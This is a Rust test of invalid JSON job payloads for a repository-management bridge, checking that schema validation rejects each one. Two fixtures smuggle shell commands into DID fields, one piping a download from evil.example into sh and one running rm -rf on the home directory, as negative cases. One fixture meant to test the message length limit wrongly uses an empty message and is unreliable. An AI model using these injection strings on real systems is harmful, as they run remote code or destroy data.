/// Each fixture in `payload.invalid-examples.json` MUST be
/// rejected by at least one of: serde deserialization, or
/// JSON-Schema validation under the `validate` feature. The
/// fixture file documents the producer-side bug class that
/// each payload exemplifies; this generated test pins it.
#[cfg(feature = "validate")]
#[test]
fn rejects_invalid_examples() {
    use trust_tasks_rs::validate::ValidatedPayload;
    let fixtures: &[(&str, &str)] = &[
        (
            "`kind` is one of the eight forge-neutral kinds.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"deleteRepo\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`jobId`, `namespace` and `kind` are always required.",
            "{\n  \"kind\": \"archive\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "Jobs never carry forge credentials.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"archive\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\",\n  \"token\": \"ghs_example\"\n}",
        ),
        (
            "A desired role names a git right, not a forge role: mapping rights to roles is the adapter's job.",
            "{\n  \"desiredRoles\": [\n    {\n      \"account\": {\n        \"forge\": \"github.com\",\n        \"id\": \"9120045\",\n        \"login\": \"bob-builds\"\n      },\n      \"right\": \"admin\",\n      \"subject\": \"did:webvh:QmBobScid2:acme-vtc.example:bob\"\n    }\n  ],\n  \"jobId\": \"job_1\",\n  \"kind\": \"projectRoles\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "Step names are lowerCamelCase identifiers.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"bootstrap\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\",\n  \"steps\": [\n    \"required-check\"\n  ]\n}",
        ),
        (
            "`removeAccounts`, when present, names at least one account: an empty list would be a job that asks for nothing to be removed while looking as though it did.",
            "{\n  \"desiredRoles\": [],\n  \"jobId\": \"job_1\",\n  \"kind\": \"projectRoles\",\n  \"namespace\": \"ns_1\",\n  \"removeAccounts\": [],\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`removeAccounts` lists forge accounts, not DIDs: the account to take off the forge often belongs to someone with no DID the VTC knows.",
            "{\n  \"desiredRoles\": [],\n  \"jobId\": \"job_1\",\n  \"kind\": \"projectRoles\",\n  \"namespace\": \"ns_1\",\n  \"removeAccounts\": [\n    \"did:webvh:QmDanScid4:dan.example\"\n  ],\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`subject` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"beginAccountLink\",\n  \"namespace\": \"ns_1\",\n  \"subject\": \"did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)\"\n}",
        ),
        (
            "`subject` is a DID, and a DID has no whitespace in it.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"beginAccountLink\",\n  \"namespace\": \"ns_1\",\n  \"subject\": \"did:web:acme-vtc.example:bob evil\"\n}",
        ),
        (
            "`subject` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"beginAccountLink\",\n  \"namespace\": \"ns_1\",\n  \"subject\": \"did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK\"\n}",
        ),
        (
            "`subject` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"beginAccountLink\",\n  \"namespace\": \"ns_1\",\n  \"subject\": \"did:WebVH:QmBobScid2:acme-vtc.example:bob\"\n}",
        ),
        (
            "`desiredRoles[].subject` is a DID too: the same syntax applies to every DID a job carries.",
            "{\n  \"desiredRoles\": [\n    {\n      \"account\": {\n        \"forge\": \"github.com\",\n        \"id\": \"9120045\",\n        \"login\": \"bob-builds\"\n      },\n      \"right\": \"git.repo.maintain\",\n      \"subject\": \"did:web:acme-vtc.example;rm${IFS}-rf${IFS}~\"\n    }\n  ],\n  \"jobId\": \"job_1\",\n  \"kind\": \"projectRoles\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "A pull request number is a positive integer: the forge numbers pull requests from 1.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"Only committers may open pull requests here.\",\n  \"namespace\": \"ns_1\",\n  \"number\": 0,\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "A pull request number is an integer, not a string.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"Only committers may open pull requests here.\",\n  \"namespace\": \"ns_1\",\n  \"number\": \"42\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "The comment is at most 16384 characters; a longer message is the VTC's template gone wrong, not something to post.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"\",\n  \"namespace\": \"ns_1\",\n  \"number\": 42,\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "An empty message would post an empty comment; a close always says why.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"\",\n  \"namespace\": \"ns_1\",\n  \"number\": 42,\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`message` travels with `number`: a message alone names no pull request.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"Only committers may open pull requests here.\",\n  \"namespace\": \"ns_1\",\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`number` travels with `message`: the bridge never closes a pull request without saying why.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"namespace\": \"ns_1\",\n  \"number\": 42,\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
        (
            "`number` names a pull request in `repo`, so a job carrying one names `repo`.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"message\": \"Only committers may open pull requests here.\",\n  \"namespace\": \"ns_1\",\n  \"number\": 42\n}",
        ),
        (
            "`closePullRequest` asks for a comment and a close, never a merge or a label: there is no member for anything else.",
            "{\n  \"jobId\": \"job_1\",\n  \"kind\": \"closePullRequest\",\n  \"labels\": [\n    \"rejected\"\n  ],\n  \"message\": \"Only committers may open pull requests here.\",\n  \"namespace\": \"ns_1\",\n  \"number\": 42,\n  \"repo\": \"github.com/acme/widgets\"\n}",
        ),
    ];
    for (i, (note, raw)) in fixtures.iter().enumerate() {
        let value: serde_json::Value = match serde_json::from_str(raw) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let serde_ok = serde_json::from_value::<spec::Payload>(value.clone()).is_ok();
        let schema_ok = spec::Payload::validate_value(&value).is_ok();
        assert!(
            !(serde_ok && schema_ok),
            "invalid-example #{} ({:?}) was accepted by both serde and JSON Schema; \
                         the fixture's stated failure class is no longer caught:\n{}",
            i + 1,
            note,
            raw
        );
    }
}
